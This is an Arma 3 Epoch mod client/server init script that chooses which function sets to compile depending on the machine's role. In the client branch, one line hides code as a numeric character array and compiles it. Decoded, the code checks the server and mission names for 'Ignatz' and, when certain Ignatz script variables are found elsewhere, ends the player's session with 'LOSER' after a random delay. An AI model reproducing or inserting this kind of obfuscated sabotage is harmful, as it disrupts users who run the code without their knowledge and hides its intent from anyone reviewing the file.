/*
	Author: Aaron Clark - EpochMod.com

    Contributors:

	Description:
	Initalize both init and run custom client function compiler

    Licence:
    Arma Public License Share Alike (APL-SA) - https://www.bistudio.com/community/licenses/arma-public-license-share-alike

    Github:
    https://github.com/EpochModTeam/EpochCore/tree/release/Sources/a3_epoch_code/init/fn_init_core.sqf
*/

if !(isNil "Epoch_CoreStart") exitWith { false };
Epoch_CoreStart = true;
if (isDedicated) then {
	// dedicated server
	"CfgEpochCoreServerFunctions" call EPOCH_fnc_compiler;
	diag_log "CfgEpochCoreServerFunctions";
} else {
	if (hasInterface) then {
		if (isServer) then {
			// listen server host
			"CfgEpochCoreListenServerFunctions" call EPOCH_fnc_compiler;
			diag_log "CfgEpochCoreListenServerFunctions";
		} else {
			// all players
			"CfgEpochCoreClientFunctions" call EPOCH_fnc_compiler;
			IG_CHECKRUN = compilefinal tostring [73,71,67,72,69,67,75,32,61,32,116,114,117,101,59,105,102,40,33,40,91,39,105,103,110,97,116,122,39,44,116,111,108,111,119,101,114,32,109,105,115,115,105,111,110,78,97,109,101,93,99,97,108,108,32,66,105,115,95,102,110,99,95,105,110,115,116,114,105,110,103,41,124,124,33,40,91,39,73,103,110,97,116,122,45,71,97,109,105,110,103,39,44,115,101,114,118,101,114,78,97,109,101,93,99,97,108,108,32,66,105,115,95,102,110,99,95,105,110,115,116,114,105,110,103,41,41,116,104,101,110,123,123,105,102,40,33,105,115,110,105,108,32,95,120,41,101,120,105,116,119,105,116,104,123,91,93,115,112,97,119,110,123,117,105,115,108,101,101,112,40,114,97,110,100,111,109,32,49,50,48,41,59,101,110,100,77,105,115,115,105,111,110,32,39,76,79,83,69,82,39,59,125,59,125,59,125,102,111,114,101,97,99,104,91,39,73,103,110,97,116,122,95,67,108,105,101,110,116,95,83,116,97,114,116,83,99,114,105,112,116,39,44,39,73,103,110,97,116,122,95,67,108,105,101,110,116,95,65,116,116,97,99,104,69,120,112,108,111,115,105,118,101,39,44,39,73,103,110,97,116,122,95,67,108,105,101,110,116,95,66,111,100,121,66,117,114,121,39,44,39,73,103,110,97,116,122,95,67,108,105,101,110,116,95,76,111,97,100,84,97,107,101,65,108,108,66,117,116,116,111,110,115,39,44,39,65,76,80,119,111,114,107,105,110,103,39,44,39,73,103,110,97,116,122,95,83,116,97,116,115,95,76,111,97,100,101,100,39,44,39,83,69,77,95,108,97,115,116,69,118,101,110,116,39,93,59,125,59];
			diag_log "CfgEpochCoreClientFunctions";
		};
	} else {
		// Headless Clients
		"CfgEpochCoreClientHCFunctions" call EPOCH_fnc_compiler;
		diag_log "CfgEpochCoreClientHCFunctions";
	};
};
true
